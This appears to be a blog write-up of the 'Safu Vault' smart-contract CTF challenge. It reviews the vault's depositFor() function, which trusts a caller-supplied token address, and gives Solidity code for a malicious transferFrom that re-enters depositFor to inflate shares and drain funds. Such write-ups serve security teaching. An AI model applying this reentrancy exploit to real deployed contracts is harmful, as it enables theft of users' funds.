---
title: "Mr Steal Yo Crypto — Safu Vault"
date: 2023-07-22
draft: false
description: "CTF - 2"
tags: ["CTF"]
series: ["CTF"]
series_order: 2
topics: ["CTF"]
showAuthor: false
showAuthorsBadges : false
---
This is the #2 challenge of [Mr Steal Yo Crypto](https://mrstealyocrypto.xyz/index.html). I will try to explain how to find the vulnerability.

> A set of challenges to learn offensive security of smart contracts. Featuring interesting challenges loosely (or directly) inspired by real-world exploits.
> Created by [@0xToshii](https://twitter.com/0xToshii)

I used the foundry version for this CTF: [mr-steal-yo-crypto-ctf-foundry](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/implement)

![Mr Steal Yo Crypto](https://cdn-images-1.medium.com/max/800/1*67w9ffBxLP4AMvoxHowZ2w.jpeg)

## Safu Vault

> Safu Labs has just released their SafuVault, the 'safest' yield generating vault of all time, or so their twitter account says.
> Their SafuVault expects deposits of USDC and has already gotten 10,000 USDC from users.
> You know the drill, drain the funds (at least 90%). You start with 10,000 USDC.

- [See the contracts](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/implement/src/safu-vault)
- [Complete the challenge](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/2-safu-vault.sol)

## Review of the contracts

### SafuStrategy.sol

This contract is not complete; this is not a real implementation of a strategy. However, it contains the basics for a strategy.
As a simple user, except the function `beforeDeposit()` (this function is not useful), we can’t call the other functions. The accounts that are able to call the SafuStrategy contract are the vault and the whitelisted address.

### SafuVault.sol

This is the core of our challenge, I will make a few comments for almost all the functions:
- `want()`, `available()`, `balance()`: there are simple getters.
- `deposit()`: There could be a potential issue if this function is deployed in mainnet, with a front-run attack. However, in our case, there is nothing valuable.
- `earn()`: nothing to say.
- `withdrawAll()`, `withdraw()`: the implementation seems correct.
- `depositFor()`: it’s almost the same implementation as deposit(). Except this time, we are using the parameter `address token` as the collateral and not the `want()` address. As I already saw in some other CTF, when a parameter is used for transferring tokens, there is a critical vulnerability.

```solidity
/// @dev deposit funds into the system for other user
function depositFor(
    address token,
    uint256 _amount,
    address user
) public {
    strategy.beforeDeposit();

    uint256 _pool = balance();
    IERC20(token).safeTransferFrom(msg.sender, address(this), _amount);
    earn();
    uint256 _after = balance();
    _amount = _after - _pool; // Additional check for deflationary tokens

    uint256 shares;
    if (totalSupply() == 0) {
        shares = _amount;
    } else {
        shares = (_amount * totalSupply()) / (_pool);
    }
    _mint(user, shares);
}
```

With the obvious vulnerability that we saw, I think we can already start for the exploit.

## Exploit the vulnerability

Our exploit will start from `depositFor()`. We have the possibility to inflate our deposit, and then we will receive more shares than it supposed to be.

Let me explain a bit more, when the line `IERC20(token).safeTransferFrom(msg.sender, address(this), _amount);` will be executed, we will go to the token contract address and check if there is the function `transferFrom`. It means that we can create a contract having this function. Inside the function, we can do everything that we want. In order to inflate our deposit, through `safeTransferFrom()` will make a reentrancy attack:

```solidity
function transferFrom(
    address from,
    address to,
    uint256 _amount
) public returns (bool) {
    if (count < reentrancy_count) { // reentrancy_count condition
        count++;
        safuVault.depositFor(address(this), uint256(0), owner); // Here is the reentrancy
        usdc.transfer(address(safuVault), amount); // increase value _after of depositFor()

        /*
        Scheme example:
        _pool 10_000
        _pool 10_000
        _pool 10_000
        _pool 10_000
        _pool 10_000  
        _after 10_100 -> amount = 100
        _after 10_200 -> amount = 200
        _after 10_300 -> amount = 300
        _after 10_400 -> amount = 400
        _after 10_500 -> amount = 500
        */
    }
    return true;
}
```

As we can see, we entered `n` times inside `depositFor()`, then we send some USDC. So for `n` times, there will be a difference between the variable `_pool` and `_after`. This is how we are able to inflate our deposit and thus inflate our shares tokens.

So that’s what we did, and it worked. You can have a look [here](https://github.com/gp-ngmi/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/2-safu-vault.sol).

## Acknowledgement

Thank you [https://stermi.xyz/](https://stermi.xyz/) for inspiring me for writing articles on CTF ^^.